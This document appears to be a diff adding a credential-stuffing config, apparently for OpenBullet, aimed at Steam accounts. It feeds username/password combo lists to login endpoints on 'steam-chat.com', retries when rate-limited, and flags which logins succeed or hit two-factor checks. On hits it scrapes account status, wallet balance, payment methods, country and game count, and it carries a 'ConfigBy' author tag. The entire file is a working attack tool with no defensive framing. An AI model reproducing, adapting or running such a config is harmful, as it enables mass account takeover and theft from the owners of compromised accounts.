@@ -1,0 +1,179 @@
+string steamGuid = Guid.NewGuid().ToString();
+
+BLOCK:UrlEncode
+  input = $"<input.USER>"
+  => VAR @steamUser
+ENDBLOCK
+
+BLOCK:UrlEncode
+  input = $"<input.PASS>"
+  => VAR @steamPass
+ENDBLOCK
+
+BLOCK:RandomUserAgent
+  => VAR @userAgent
+ENDBLOCK
+
+#SteamLogin
+
+BLOCK:HttpRequest
+  url = "https://steam-chat.com/login/getrsakey/"
+  method = POST
+  httpLibrary = SystemNet
+  customHeaders = ${("Host", "steam-chat.com"), ("Accept", "application/json, text/plain, */*"), ("Content-Type", "application/x-www-form-urlencoded"), ("Device", "f5bf4f66306d8cf2cb95d342c02a5941"), ("Accept-Encoding", "gzip, deflate, br"), ("User-Agent", "okhttp/4.9.2"), ("Connection", "keep-alive")}
+  httpVersion = "1.1"
+  TYPE:STANDARD
+  $"donotcache=&username=<steamUser>"
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+IF STRINGKEY @data.RESPONSECODE Contains "429"
+JUMP #SteamLogin
+END
+
+BLOCK:Parse
+  input = @data.SOURCE
+  leftDelim = "\"publickey_mod\":\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @publicKeyMod
+ENDBLOCK
+
+BLOCK:Parse
+  input = @data.SOURCE
+  leftDelim = "\"publickey_exp\":\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @publicKeyExp
+ENDBLOCK
+
+BLOCK:Parse
+  input = @data.SOURCE
+  leftDelim = "\"timestamp\":\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @timestamp
+ENDBLOCK
+
+#SteamAuth
+
+BLOCK:HttpRequest
+  url = "https://steam-chat.com/login/dologin/"
+  method = POST
+  httpLibrary = SystemNet
+  customHeaders = ${("Host", "steam-chat.com"), ("Accept", "application/json, text/plain, */*"), ("Content-Type", "application/x-www-form-urlencoded"), ("Device", "f5bf4f66306d8cf2cb95d342c02a5941"), ("Accept-Encoding", "gzip, deflate, br"), ("User-Agent", "okhttp/4.9.2"), ("Connection", "keep-alive")}
+  httpVersion = "1.1"
+  TYPE:STANDARD
+  $"donotcache=&password=<steamPass>&username=<steamUser>&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=&captcha_text=&emailsteamid=&rsatimestamp=<timestamp>&remember_login=false&oauth_client_id=C1F110D6&mobile_chat_client=true"
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+BLOCK:Keycheck
+  KEYCHAIN FAIL OR
+    STRINGKEY @data.SOURCE Contains "The account name or password that you have entered is incorrect"
+    STRINGKEY @data.SOURCE Contains "Incorrect account name or password."
+    STRINGKEY @data.RESPONSECODE Contains "403"
+  KEYCHAIN CUSTOM OR
+    STRINGKEY @data.SOURCE Contains "requires_twofactor\":true"
+    STRINGKEY @data.SOURCE Contains "emailauth_needed\":true"
+  KEYCHAIN SUCCESS OR
+    STRINGKEY @data.SOURCE Contains "success\":true"
+ENDBLOCK
+
+BLOCK:Parse
+  input = @data.SOURCE
+  leftDelim = "\"steamid\":\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @steamId
+ENDBLOCK
+
+#SteamAccount
+
+BLOCK:HttpRequest
+  url = "https://store.steampowered.com/account/"
+  method = GET
+  httpLibrary = SystemNet
+  customHeaders = ${("User-Agent", "okhttp/4.9.2"), ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"), ("Accept-Language", "en-us"), ("Accept-Encoding", "gzip, deflate, br")}
+  httpVersion = "1.1"
+  TYPE:STANDARD
+  $""
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+BLOCK:Parse
+  input = @data.SOURCE
+  leftDelim = "account_manage_label\">Status:"
+  rightDelim = "class=\"account_manage_link"
+  MODE:LR
+  => VAR @accountStatus
+ENDBLOCK
+
+BLOCK:Parse
+  input = @accountStatus
+  leftDelim = "\">"
+  rightDelim = "</a>"
+  MODE:LR
+  => CAP @Status
+ENDBLOCK
+
+BLOCK:Parse
+  input = @data.SOURCE
+  leftDelim = "accountData price\">"
+  rightDelim = "</div>"
+  MODE:LR
+  => CAP @Balance
+ENDBLOCK
+
+BLOCK:Parse
+  input = @data.SOURCE
+  leftDelim = "You have"
+  rightDelim = "associated with this account"
+  MODE:LR
+  => VAR @paymentMethod
+ENDBLOCK
+
+BLOCK:Translate
+  input = @paymentMethod
+  translations = {("no payment methods", "None")}
+  => CAP @PaymentMethod
+ENDBLOCK
+
+#SteamGames
+
+BLOCK:HttpRequest
+  url = $"https://steamcommunity.com/profiles/<steamId>/games?tab=all"
+  method = GET
+  httpLibrary = SystemNet
+  customHeaders = ${("User-Agent", "okhttp/4.9.2"), ("Pragma", "no-cache"), ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"), ("Accept-Language", "en-us"), ("Accept-Encoding", "gzip, deflate, br")}
+  httpVersion = "1.1"
+  TYPE:STANDARD
+  $""
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+BLOCK:Parse
+  input = @data.SOURCE
+  leftDelim = ";country_code&quot;:&quot;"
+  rightDelim = "&quot"
+  MODE:LR
+  => CAP @Country
+ENDBLOCK
+
+BLOCK:CountOccurrences
+  input = @data.SOURCE
+  match = ";name&quot;:&quot;"
+  => CAP @Total Games
+ENDBLOCK
+
+BLOCK:Keycheck
+  KEYCHAIN CUSTOM OR
+    STRINGKEY @data.SOURCE Contains "Your profile is being forced private due to an active Community Ban on your account"
+  KEYCHAIN CUSTOM OR
+    STRINGKEY @Total Games EqualTo "0"
+ENDBLOCK
+
+BLOCK:ConstantString
+  value = "@fuv1y"
+  => CAP @ConfigBy
+ENDBLOCK
